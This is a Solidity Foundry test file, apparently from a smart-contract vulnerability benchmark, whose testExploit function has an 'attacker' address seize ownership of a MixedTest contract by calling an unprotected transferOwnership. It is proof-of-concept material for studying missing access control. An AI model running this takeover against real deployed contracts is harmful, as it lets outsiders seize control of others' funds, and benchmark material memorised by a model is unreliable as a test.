// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/62ce34ec-b052-4104-990f-02b196829969_Mixed.sol";

contract PocTest is BaseTestWithBalanceLog {
    MixedTest target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new MixedTest();
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        target.transferOwnership(attacker);
        assertEq(target.owner(), attacker);
    }
}
